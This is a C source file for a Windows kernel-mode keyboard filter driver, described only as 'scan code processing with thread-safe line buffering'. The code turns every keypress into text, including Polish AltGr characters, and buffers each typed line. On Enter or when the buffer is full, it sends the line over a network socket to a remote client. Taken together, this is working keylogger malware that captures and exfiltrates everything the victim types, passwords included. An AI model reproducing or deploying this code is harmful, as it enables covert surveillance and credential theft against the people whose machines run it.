/*++
Module Name: scancode.c
Abstract: Keyboard scan code processing with thread-safe line buffering
Environment: Kernel mode only.
--*/

#include "scancode.h"
#include "network.h"

// Keyboard State
ULONG g_KeyboardState = 0;
BOOLEAN g_RightAltPressed = FALSE;

// Line Buffer with atomic operations
#define KEYBOARD_LINE_BUFFER_SIZE 512

typedef struct _KEYBOARD_LINE_BUFFER {
    UCHAR Buffer[KEYBOARD_LINE_BUFFER_SIZE];
    volatile LONG Position;  // Changed to LONG for atomic operations
    KSPIN_LOCK Lock;
    BOOLEAN Initialized;
} KEYBOARD_LINE_BUFFER, *PKEYBOARD_LINE_BUFFER;

static KEYBOARD_LINE_BUFFER g_LineBuffer = {0};

// Base Scan Code Table (lowercase/normal state)
static const UCHAR g_BaseScancodes[84][12] = {
    "?", "[Esc]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BS]", "[Tab]",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[Ent]", "[LCt]", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";", "\'", "`", "[LSh]", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "[RSh]", "[KP*]", "[LAl]", " ", "[Cap]",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "[Num]", "[Scr]",
    "[KP7]", "[KP8]", "[KP9]", "[KP-]", "[KP4]", "[KP5]", "[KP6]", "[KP+]",
    "[KP1]", "[KP2]", "[KP3]", "[KP0]", "[KP.]"
};

// Shift mappings for digits (scan codes 0x02-0x0B map to 0-9 in array)
static const UCHAR g_ShiftDigits[10][2] = {
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"
};

// Shift mappings for special characters
static const UCHAR g_ShiftChars[][2] = {
    "+", "{", "}", "|", ":", "\"", "~", "<", ">", "?"
};

// Extended (E0) scan codes
static const UCHAR g_E0Scancodes[18][12] = {
    "[RCt]", "[KP/]", "[Prt]", "[RAl]", "[Hom]", "[Up]", "[PgU]",
    "[Lft]", "[Rgt]", "[End]", "[Dn]", "[PgD]", "[Ins]", "[Del]",
    "[LWin]", "[RWin]", "[Men]", "?"
};

// Polish AltGr characters (UTF-8 encoded)
static const UCHAR g_PolishCharsAltGr[][4] = {
    "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ú", "ź",
    "Ą", "Ć", "Ę", "Ł", "Ń", "Ó", "Ś", "Ú", "Ź"
};

// Scan code definitions
#define SC_CAPSLOCK     0x3A
#define SC_LSHIFT       0x2A
#define SC_RSHIFT       0x36
#define SC_NUMLOCK      0x45
#define SC_RALT         0x38

#define SC_E0_RCTRL     0x1D
#define SC_E0_RALT      0x38
#define SC_E0_LWIN      0x5B
#define SC_E0_RWIN      0x5C
#define SC_E0_MENU      0x5D

#define MAX_NORMAL_SC   0x54
#define MAX_E0_SC       0x5D

// Scan code range checks
#define IS_LETTER(sc) (((sc) >= 0x10 && (sc) <= 0x19) || \
                       ((sc) >= 0x1E && (sc) <= 0x26) || \
                       ((sc) >= 0x2C && (sc) <= 0x32))

#define IS_DIGIT(sc)  ((sc) >= 0x02 && (sc) <= 0x0B)

#define IS_MODIFIER(str) ( \
    (strcmp((PCCHAR)(str), "[LSh]") == 0) || \
    (strcmp((PCCHAR)(str), "[RSh]") == 0) || \
    (strcmp((PCCHAR)(str), "[LCt]") == 0) || \
    (strcmp((PCCHAR)(str), "[RCt]") == 0) || \
    (strcmp((PCCHAR)(str), "[LAl]") == 0) || \
    (strcmp((PCCHAR)(str), "[RAl]") == 0) || \
    (strcmp((PCCHAR)(str), "[Cap]") == 0) || \
    (strcmp((PCCHAR)(str), "[Num]") == 0) || \
    (strcmp((PCCHAR)(str), "[Scr]") == 0) )

#define IS_SEND_TRIGGER(str) (strcmp((PCCHAR)(str), "[Ent]") == 0)

// Helper: Convert letter to uppercase
static VOID ToUpperCase(UCHAR* dest, const UCHAR* src)
{
    SIZE_T i = 0;
    while (src[i] && i < 11) {
        dest[i] = (src[i] >= 'a' && src[i] <= 'z') ? (src[i] - 32) : src[i];
        i++;
    }
    dest[i] = '\0';
}

// Helper: Get shifted character for special chars
static PCUCHAR GetShiftedChar(UCHAR makeCode)
{
    switch (makeCode) {
        case 0x0D: return g_ShiftChars[0];  // = -> +
        case 0x1A: return g_ShiftChars[1]; // [ -> {
        case 0x1B: return g_ShiftChars[2]; // ] -> }
        case 0x2B: return g_ShiftChars[3]; // \ -> |
        case 0x27: return g_ShiftChars[4]; // ; -> :
        case 0x28: return g_ShiftChars[5]; // ' -> "
        case 0x29: return g_ShiftChars[6]; // ` -> ~
        case 0x33: return g_ShiftChars[7]; // , -> 
        case 0x34: return g_ShiftChars[8]; // . -> >
        case 0x35: return g_ShiftChars[9]; // / -> ?
        default: return NULL;
    }
}

VOID
KbdHandler_InitializeBuffer(VOID)
{
    KeInitializeSpinLock(&g_LineBuffer.Lock);
    InterlockedExchange(&g_LineBuffer.Position, 0);
    g_LineBuffer.Initialized = TRUE;
}

VOID
KbdHandler_SendBufferedLine(VOID)
{
    NTSTATUS Status;
    SIZE_T BytesSent;
    KIRQL OldIrql;
    UCHAR LocalBuffer[KEYBOARD_LINE_BUFFER_SIZE];
    LONG LocalPosition;
    SOCKET LocalSocket;

    if (!g_LineBuffer.Initialized)
        return;

    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
    
    LocalPosition = InterlockedExchange(&g_LineBuffer.Position, 0);
    
    if (LocalPosition > 0) {
        RtlCopyMemory(LocalBuffer, g_LineBuffer.Buffer, LocalPosition);
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
        
        // Get socket handle atomically
        LocalSocket = (SOCKET)InterlockedCompareExchange64(
            (LONG64*)&ClientSocket, 
            (LONG64)ClientSocket, 
            (LONG64)ClientSocket
        );
        
        if (LocalSocket != 0) {
            Status = WSKSendTo(
                LocalSocket,
                LocalBuffer,
                LocalPosition,
                &BytesSent,
                0,
                NULL,
                0,
                NULL,
                NULL
            );

            if (!NT_SUCCESS(Status)) {
                KBD_ERROR("WSKSendTo failed: 0x%08X", Status);
            }
        }
    } else {
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
    }
}

VOID
KbdHandler_FlushBuffer(VOID)
{
    LONG CurrentPosition;
    
    if (!g_LineBuffer.Initialized)
        return;
    
    // Atomic check if buffer has data
    CurrentPosition = InterlockedCompareExchange(&g_LineBuffer.Position, 0, 0);
    
    if (CurrentPosition > 0) {
        KbdHandler_SendBufferedLine();
    }
}

BOOLEAN
KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString)
{
    SIZE_T keyLen;
    KIRQL OldIrql;
    LONG OldPosition;
    LONG NewPosition;

    if (!g_LineBuffer.Initialized || KeyString == NULL)
        return FALSE;

    keyLen = strlen((PCCHAR)KeyString);
    if (keyLen == 0 || keyLen >= KEYBOARD_LINE_BUFFER_SIZE)
        return FALSE;

    if (IS_SEND_TRIGGER(KeyString)) {
        KbdHandler_SendBufferedLine();
        return TRUE;
    }

    if (IS_MODIFIER(KeyString))
        return FALSE;

    // Ignore F1-F12
    if (KeyString[0] == 'F' && 
        (KeyString[1] >= '1' && KeyString[1] <= '9') &&
        (KeyString[2] == '\0' || 
         (KeyString[2] >= '0' && KeyString[2] <= '2' && KeyString[3] == '\0'))) {
        return FALSE;
    }

    // Atomic check and reserve space
    do {
        OldPosition = InterlockedCompareExchange(&g_LineBuffer.Position, 0, 0);
        NewPosition = OldPosition + (LONG)keyLen;
        
        if (NewPosition >= KEYBOARD_LINE_BUFFER_SIZE - 1) {
            // Buffer full, send it
            KbdHandler_SendBufferedLine();
            return TRUE;
        }
        
        // Try to atomically update position
        if (InterlockedCompareExchange(&g_LineBuffer.Position, NewPosition, OldPosition) == OldPosition) {
            break;
        }
    } while (TRUE);

    // Now copy data with spinlock protection
    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
    RtlCopyMemory(
        &g_LineBuffer.Buffer[OldPosition], 
        KeyString, 
        keyLen
    );
    KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);

    return FALSE;
}

VOID
KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData)
{
    UCHAR MakeCode;
    PCUCHAR KeyString;
    BOOLEAN IsKeyPress;
    UCHAR UpperBuf[12];
    BOOLEAN ShiftActive, CapsActive;
    
    if (InputData == NULL)
        return;
    
    MakeCode = (UCHAR)InputData->MakeCode;
    IsKeyPress = !FlagOn(InputData->Flags, KEY_BREAK);
    
    // Handle E0 extended codes
    if (FlagOn(InputData->Flags, KEY_E0)) {
        switch (MakeCode) {
            case 0x1D: KeyString = g_E0Scancodes[0]; break;
            case 0x35: KeyString = g_E0Scancodes[1]; break;
            case 0x37: KeyString = g_E0Scancodes[2]; break;
            case 0x38: KeyString = g_E0Scancodes[3]; break;
            case 0x47: KeyString = g_E0Scancodes[4]; break;
            case 0x48: KeyString = g_E0Scancodes[5]; break;
            case 0x49: KeyString = g_E0Scancodes[6]; break;
            case 0x4B: KeyString = g_E0Scancodes[7]; break;
            case 0x4D: KeyString = g_E0Scancodes[8]; break;
            case 0x4F: KeyString = g_E0Scancodes[9]; break;
            case 0x50: KeyString = g_E0Scancodes[10]; break;
            case 0x51: KeyString = g_E0Scancodes[11]; break;
            case 0x52: KeyString = g_E0Scancodes[12]; break;
            case 0x53: KeyString = g_E0Scancodes[13]; break;
            case 0x5B: KeyString = g_E0Scancodes[14]; break;
            case 0x5C: KeyString = g_E0Scancodes[15]; break;
            case 0x5D: KeyString = g_E0Scancodes[16]; break;
            default:   KeyString = g_E0Scancodes[17]; break;
        }
        
        if (MakeCode == SC_E0_RALT)
            g_RightAltPressed = IsKeyPress;
        
        if (MakeCode > MAX_E0_SC)
            return;
    }
    // Handle normal scan codes
    else {
        if (MakeCode > MAX_NORMAL_SC)
            return;
        
        ShiftActive = (g_KeyboardState & KBD_STATE_SHIFT) != 0;
        CapsActive = (g_KeyboardState & KBD_STATE_CAPSLOCK) != 0;
        
        // Check Polish AltGr combinations
        if (g_RightAltPressed && IsKeyPress) {
            switch (MakeCode) {
                case 0x1E: KeyString = g_PolishCharsAltGr[ShiftActive ? 9 : 0]; goto OutputKey;
                case 0x2E: KeyString = g_PolishCharsAltGr[ShiftActive ? 10 : 1]; goto OutputKey;
                case 0x12: KeyString = g_PolishCharsAltGr[ShiftActive ? 11 : 2]; goto OutputKey;
                case 0x26: KeyString = g_PolishCharsAltGr[ShiftActive ? 12 : 3]; goto OutputKey;
                case 0x31: KeyString = g_PolishCharsAltGr[ShiftActive ? 13 : 4]; goto OutputKey;
                case 0x18: KeyString = g_PolishCharsAltGr[ShiftActive ? 14 : 5]; goto OutputKey;
                case 0x1F: KeyString = g_PolishCharsAltGr[ShiftActive ? 15 : 6]; goto OutputKey;
                case 0x2D: KeyString = g_PolishCharsAltGr[ShiftActive ? 16 : 7]; goto OutputKey;
                case 0x2C: KeyString = g_PolishCharsAltGr[ShiftActive ? 17 : 8]; goto OutputKey;
            }
        }
        
        // Runtime translation based on state
        if (IS_LETTER(MakeCode)) {
            // Letters: uppercase if (shift XOR caps)
            if ((ShiftActive && !CapsActive) || (!ShiftActive && CapsActive)) {
                ToUpperCase(UpperBuf, g_BaseScancodes[MakeCode]);
                KeyString = UpperBuf;
            } else {
                KeyString = g_BaseScancodes[MakeCode];
            }
        }
        else if (IS_DIGIT(MakeCode)) {
            // Digits: shift changes to symbols
            if (ShiftActive)
                KeyString = g_ShiftDigits[MakeCode - 0x02];
            else
                KeyString = g_BaseScancodes[MakeCode];
        }
        else {
            // Special chars: check shift map
            PCUCHAR shifted = GetShiftedChar(MakeCode);
            if (ShiftActive && shifted != NULL)
                KeyString = shifted;
            else
                KeyString = g_BaseScancodes[MakeCode];
        }
        
        // Update keyboard state
        if (IsKeyPress) {
            switch (MakeCode) {
                case SC_CAPSLOCK: g_KeyboardState ^= KBD_STATE_CAPSLOCK; break;
                case SC_LSHIFT:
                case SC_RSHIFT:   g_KeyboardState |= KBD_STATE_SHIFT; break;
                case SC_NUMLOCK:  g_KeyboardState ^= KBD_STATE_NUMLOCK; break;
                case SC_RALT:     g_RightAltPressed = TRUE; break;
            }
        } else {
            switch (MakeCode) {
                case SC_LSHIFT:
                case SC_RSHIFT: g_KeyboardState &= ~KBD_STATE_SHIFT; break;
                case SC_RALT:   g_RightAltPressed = FALSE; break;
            }
        }
    }
    
OutputKey:
    if (IsKeyPress) {
        KbdHandler_AddToLineBuffer(KeyString);
    }
}

VOID
KbdHandler_ConfigureMapping(_In_ PKEYBOARD_INPUT_DATA InputData)
{
    UNREFERENCED_PARAMETER(InputData);
}